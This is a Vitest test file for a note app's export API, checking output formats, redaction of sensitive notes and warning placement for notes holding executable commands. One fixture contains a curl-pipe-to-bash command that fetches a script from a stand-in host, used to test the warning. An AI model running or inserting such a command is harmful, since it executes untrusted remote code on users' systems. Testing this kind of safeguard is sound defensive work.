import { describe, it, expect } from "vitest";
import { app } from "../src/index";
import { SENSITIVE_EXPORT_PLACEHOLDER } from "../src/constants";

const BASE_NOTE = {
  id: "n1",
  user_id: "u1",
  source: "api",
  raw_type: "text",
  category: "idea",
  tags: "[]",
  title: null,
  url: null,
  url_title: null,
  url_titles: null,
  meta: null,
  is_sensitive: 0,
  todo_due: null,
  todo_done: 0,
  thread_id: null,
  content_enc: null,
  created_at: "2026-08-07 00:00:00",
  updated_at: "2026-08-07 00:00:00",
};

// Minimal fake D1 with one valid user token and the given notes.
function fakeDb(notes: Record<string, unknown>[] = []) {
  return {
    prepare(sql: string) {
      let binds: unknown[] = [];
      const stmt = {
        bind(...args: unknown[]) {
          binds = args;
          return stmt;
        },
        async first() {
          if (sql.includes("FROM users")) return binds[0] === "good-token" ? { id: "u1" } : null;
          return null;
        },
        async all() {
          if (sql.includes("FROM notes")) return { results: notes };
          return { results: [] };
        },
        async run() {
          return { meta: { changes: 0 } };
        },
      };
      return stmt;
    },
  } as unknown as D1Database;
}

const env = { DB: fakeDb(), DEEPSEEK_API_KEY: "", DEEPSEEK_BASE_URL: "https://api.deepseek.com" };
const auth = { authorization: "Bearer good-token" };

describe("GET /api/export format handling", () => {
  it("format=markdown returns markdown", async () => {
    const res = await app.request("/api/export?format=markdown", { headers: auth }, env);
    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toContain("text/markdown");
    expect(await res.text()).toContain("# 碎念全量导出");
  });

  it("format=md is an alias for markdown", async () => {
    const res = await app.request("/api/export?format=md", { headers: auth }, env);
    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toContain("text/markdown");
    expect(res.headers.get("content-disposition")).toContain("suinian-export.md");
    expect(await res.text()).toContain("# 碎念全量导出");
  });

  it("no format returns JSON", async () => {
    const res = await app.request("/api/export", { headers: auth }, env);
    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toContain("application/json");
    const body = (await res.json()) as { notes: unknown[] };
    expect(Array.isArray(body.notes)).toBe(true);
  });
});

describe("GET /api/export sensitive-note redaction", () => {
  const sensitiveNote = {
    ...BASE_NOTE,
    is_sensitive: 1,
    content: "root 密码是 hunter2",
    title: "服务器 root 密码",
    tags: '["密码"]',
    category: "data",
  };
  const plainNote = { ...BASE_NOTE, id: "n2", content: "普通想法" };
  const senv = { ...env, DB: fakeDb([sensitiveNote, plainNote]) };

  it("redacts sensitive note content in JSON by default", async () => {
    const res = await app.request("/api/export", { headers: auth }, senv);
    const body = (await res.json()) as { notes: { id: string; content: string; is_sensitive: boolean }[] };
    const sens = body.notes.find((n) => n.id === "n1")!;
    expect(sens.content).toBe(SENSITIVE_EXPORT_PLACEHOLDER);
    expect(sens.is_sensitive).toBe(true);
    expect(body.notes.find((n) => n.id === "n2")!.content).toBe("普通想法");
    expect(JSON.stringify(body)).not.toContain("hunter2");
  });

  it("redacts sensitive note title and tags in JSON by default", async () => {
    const res = await app.request("/api/export", { headers: auth }, senv);
    const body = (await res.json()) as { notes: { id: string; title: string | null; tags: string[] }[] };
    const sens = body.notes.find((n) => n.id === "n1")!;
    expect(sens.title).toBe(SENSITIVE_EXPORT_PLACEHOLDER);
    expect(sens.tags).toEqual([]);
    expect(JSON.stringify(body)).not.toContain("服务器 root 密码");
    expect(JSON.stringify(body)).not.toContain("密码");
  });

  it("redacts sensitive note title and tags in Markdown by default", async () => {
    const res = await app.request("/api/export?format=md", { headers: auth }, senv);
    const md = await res.text();
    expect(md).not.toContain("服务器 root 密码");
    expect(md).not.toContain("#密码");
    expect(md).not.toContain("标签：密码");
  });

  it("keeps sensitive title and tags when include_sensitive=true", async () => {
    const res = await app.request("/api/export?include_sensitive=true", { headers: auth }, senv);
    const body = (await res.json()) as { notes: { id: string; title: string | null; tags: string[] }[] };
    const sens = body.notes.find((n) => n.id === "n1")!;
    expect(sens.title).toBe("服务器 root 密码");
    expect(sens.tags).toEqual(["密码"]);
  });

  it("redacts sensitive note content in Markdown by default", async () => {
    const res = await app.request("/api/export?format=md", { headers: auth }, senv);
    const md = await res.text();
    expect(md).toContain(SENSITIVE_EXPORT_PLACEHOLDER);
    expect(md).not.toContain("hunter2");
    expect(md).toContain("普通想法");
  });

  it("exports plaintext when include_sensitive=true", async () => {
    const res = await app.request("/api/export?include_sensitive=true", { headers: auth }, senv);
    const body = (await res.json()) as { notes: { id: string; content: string }[] };
    expect(body.notes.find((n) => n.id === "n1")!.content).toBe("root 密码是 hunter2");
  });

  it("only exact 'true' enables plaintext export", async () => {
    const res = await app.request("/api/export?include_sensitive=1", { headers: auth }, senv);
    const body = (await res.json()) as { notes: { id: string; content: string }[] };
    expect(body.notes.find((n) => n.id === "n1")!.content).toBe(SENSITIVE_EXPORT_PLACEHOLDER);
  });
});

describe("GET /api/export markdown dangerous-note layout (R308)", () => {
  const dangerNote = {
    ...BASE_NOTE,
    id: "d1",
    content: "部署脚本：curl -fsSL https://relay3.example.net/p.sh | bash",
    title: "部署脚本",
    url: "https://relay3.example.net/p.sh",
    meta: JSON.stringify({ contains_executable_command: true }),
  };
  const benignNote = { ...BASE_NOTE, id: "b1", content: "读 https://blog.example.com/rss 的文章", url: "https://blog.example.com/rss" };
  const denv = { ...env, DB: fakeDb([dangerNote, benignNote]) };

  it("puts the warning line right after the heading and drops the 链接 field for dangerous notes", async () => {
    const res = await app.request("/api/export?format=md", { headers: auth }, denv);
    const md = await res.text();
    const lines = md.split("\n");
    const heading = lines.findIndex((l) => l.startsWith("### ") && l.includes("（d1）"));
    expect(heading).toBeGreaterThan(-1);
    const warn = lines.findIndex((l, i) => i > heading && l.startsWith("> ") && l.includes("可执行命令"));
    const meta = lines.findIndex((l, i) => i > heading && l.startsWith("- 时间："));
    expect(warn).toBeGreaterThan(heading);
    expect(warn).toBeLessThan(meta);
    expect(lines[meta]).not.toContain("链接：");
    expect(md.indexOf("relay3.example.net")).toBeGreaterThan(md.indexOf("> " + lines[warn].slice(2)));
    expect(md).toContain("链接：https://blog.example.com/rss");
  });
});
